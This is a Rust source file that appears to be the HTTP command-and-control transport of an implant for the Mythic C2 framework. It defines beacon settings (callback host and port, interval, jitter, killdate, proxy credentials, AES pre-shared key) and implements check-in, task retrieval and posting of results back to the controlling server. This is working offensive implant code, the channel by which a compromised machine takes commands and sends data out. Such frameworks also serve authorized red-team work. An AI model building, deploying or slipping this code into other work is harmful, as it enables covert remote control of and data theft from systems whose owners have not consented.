use super::C2Trait;
use crate::{MythicError, MythicResult, base64_decode};
use minreq::{
    Method::{self, Get, Post},
    Proxy, Request, Response,
};
use serde::{Deserialize, Serialize};
use std::collections::HashMap;

#[derive(Debug, Deserialize, Serialize)]
pub struct Http {
    #[serde(default)]
    pub aes_psk: String,
    pub callback_host: String,
    pub callback_port: u16,
    pub callback_interval: u64,
    pub callback_jitter: u32,
    pub encrypted_exchange_check: bool,
    pub get_uri: String,
    pub post_uri: String,
    pub query_path_name: String,
    pub headers: HashMap<String, String>,
    pub killdate: String,
    pub proxy_host: String,
    pub proxy_port: String,
    pub proxy_user: String,
    pub proxy_pass: String,
}

impl Default for Http {
    fn default() -> Self {
        Self {
            aes_psk: String::new(),
            callback_host: String::new(),
            callback_port: 80,
            callback_interval: 10,
            callback_jitter: 0,
            encrypted_exchange_check: false,
            get_uri: String::new(),
            post_uri: String::new(),
            query_path_name: String::new(),
            headers: HashMap::new(),
            killdate: String::new(),
            proxy_host: String::new(),
            proxy_port: String::new(),
            proxy_user: String::new(),
            proxy_pass: String::new(),
        }
    }
}

impl Http {
    fn request(&self, method: Method, url: &str, data: &str) -> MythicResult<String> {
        let req = Request::new(method, url).with_headers(&self.headers);

        let req = if self.proxy_host.len() > 4 && self.proxy_port.len() > 1 {
            let proxy_url = format!(
                "http://{}:{}@{}:{}",
                self.proxy_user, self.proxy_pass, self.proxy_host, self.proxy_port
            );
            let proxy = Proxy::new(proxy_url).map_err(|_| MythicError::Proxy)?;
            req.with_proxy(proxy)
        } else {
            req
        }
        .with_body(data);
        let resp = req
            .send()
            .map_err(|e| MythicError::Transport(e.to_string()))?;
        read_response(resp)
    }

    fn get(&self, data: &str) -> MythicResult<String> {
        // Mythic HTTPX expects URL-safe base64 (no padding) in the query string.
        let urlsafe_data = data
            .replace('+', "-")
            .replace('/', "_")
            .trim_end_matches('=')
            .to_string();
        let url = format!(
            "{}:{}/{}/?{}={}",
            self.callback_host,
            self.callback_port,
            self.get_uri,
            self.query_path_name,
            urlsafe_data
        );
        self.request(Get, &url, "")
    }

    fn post(&self, data: &str) -> MythicResult<String> {
        let url = format!(
            "{}:{}/{}",
            self.callback_host, self.callback_port, self.post_uri
        );
        self.request(Post, &url, data)
    }
}

impl C2Trait for Http {
    fn get_aes_psk(&self) -> MythicResult<[u8; 32]> {
        let aes_psk = base64_decode(&self.aes_psk)?;
        aes_psk.try_into().map_err(|_| MythicError::KeyDerivation)
    }

    fn set_aes_psk(&mut self, key: String) {
        self.aes_psk = key;
    }

    fn encrypted_exchange_check(&self) -> bool {
        self.encrypted_exchange_check
    }

    fn checkin(&self, packed: &str) -> MythicResult<String> {
        self.post(packed)
    }

    fn get_tasking(&self, packed: &str) -> MythicResult<String> {
        if packed.len() > 512 {
            self.post(packed)
        } else {
            self.get(packed)
        }
    }

    fn post_response(&self, packed: &str) -> MythicResult<String> {
        self.post(packed)
    }
}

fn read_response(resp: Response) -> MythicResult<String> {
    match resp.status_code {
        429 => return Err(MythicError::RateLimited),
        status if status >= 500 => return Err(MythicError::Http5XX),
        status if status >= 400 => return Err(MythicError::Http4XX),
        _ => {}
    }
    resp.as_str()
        .map_err(|e| match e {
            minreq::Error::InvalidUtf8InBody(_) => MythicError::Utf8,
            other => MythicError::Transport(other.to_string()),
        })
        .map(|s| s.to_string())
}
